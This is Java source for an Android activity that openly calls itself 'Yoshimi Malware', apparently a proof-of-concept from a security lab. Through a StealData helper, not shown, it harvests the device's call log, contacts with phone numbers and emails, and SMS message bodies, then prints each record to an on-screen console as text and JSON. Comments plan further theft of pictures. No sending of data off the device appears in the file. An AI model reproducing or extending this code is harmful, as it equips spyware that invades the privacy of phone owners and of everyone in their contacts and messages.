package com.redactedlabs.yoshimi;

//Android Imports

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.widget.TextView;

//Class-y Imports
import com.redactedlabs.yoshimi.StealData;

public class console extends Activity{

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.console);
		
		//Setup TextView to Print To...
		TextView console = (TextView)findViewById(R.id.consoleText);
		
		console.setText("**************************\n\tStarting up Yoshimi Malware \n**************************\n\n");
		
		// ASCII ART -- If this gets axed in the name of professionalism ... I'm going to be pissed... 
		console.append("                                            ,         ,\n");
		console.append("                                           (\\____/)\n");
		console.append("                                            (_oo_)\n");
		console.append("                                              (O)\n");
		console.append("Yoshimi                             __||__      \\)\n");
		console.append("    ,.                                  []/_______\\[]  /\n");
		console.append(" /\\-'__                               / \\______/ \\/\n");
		console.append("   / o.__o____                 /      /__\\\n");
		console.append("  \\/_/ /.____/--,    VS     (\\    /____\\ \n");
		console.append("   ||\' \n");
		console.append("   | /                              The Pink Robots\n");
		console.append("   \\_\\\n");
		console.append("   -''\n");
		
		
		console.append("\n");
		// Get's the Application Context ???		
		Context currentContext = getBaseContext();
		
		//Start Stealing Data
		RecentCall[] calls = StealData.getCalls(currentContext);
		if(calls != null){
			console.append("Recent Calls Captured...\n==========================\n\n");
			for(int i=0;i<calls.length;i++){
				console.append("Phone #:\t"+calls[i].getPhoneNumber()+"\n");
				console.append("Call Type:\t"+calls[i].getCallType()+"\n");
				console.append("Associated Name:\t"+calls[i].getName()+"\n");
				console.append("Phone # Type:\t"+calls[i].getNumberType()+"\n");
				try {
					console.append("JSON Object:\t"+calls[i].getJsonObject()+"\n\n");
				} catch (Exception e) {
					console.append("Couldn't Export to JSON...\n\n");
				}
			}
		}
		else{
			console.append("Was Unable to grab recent calls...\n");
		}
		
		// TODO - Steal Contact List
		ContactsList[] contacts = StealData.getContacts(currentContext);
		if(contacts != null){
			console.append("\n\nContacts Captured...\n==========================\n\n");
			for(int i=0;i<contacts.length;i++){
				console.append("Name:\t"+contacts[i].getContactName()+"\n");
				console.append("Phone #'s:\t"+contacts[i].getPhoneNumber()+"\n");
				console.append("Emails:\t"+contacts[i].getEmail()+"\n");
				try {
					console.append("JSON Object:\t"+contacts[i].getJsonObject()+"\n\n");
				} catch (Exception e) {
					console.append("Couldn't Export to JSON...\n\n");
				}
				
			}
		}
		else{
			console.append("Was Unable to grab contacts...\n");
		}
		
		// TODO - Steal Pictures
		
		
		// TODO - Steal SMS
		//Cursor mSMSCursor = APIInteraction.retrieveSMS(currentContext);
		SMSList[] smsList = StealData.getSMSMessages(currentContext);
		if(smsList != null){
			console.append("\n\nSMS Messages Captured...\n==========================\n\n");
			for(int i=0;i<smsList.length;i++){
				console.append("Phone #nice:\t"+smsList[i].getPhoneNumber()+"\n");
				console.append("Name:\t"+smsList[i].getContactName()+"\n");
				console.append("Date:\t"+smsList[i].getMessageDate()+"\n");
				console.append("Type:\t"+smsList[i].getMessageType()+"\n");
				console.append("Body:\t"+smsList[i].getMessageBody()+"\n");
				console.append("Read Status:\t"+smsList[i].getMessageRead()+"\n");
				try {
					console.append("JSON Object:\t"+smsList[i].getJsonObject()+"\n\n");
				} catch (Exception e) {
					console.append("Couldn't Export to JSON...\n\n");
				}
				
			}
		}
		else{
			console.append("Was Unable to grab SMS Messages...\n");
		}
		
		
		
	}
		
}
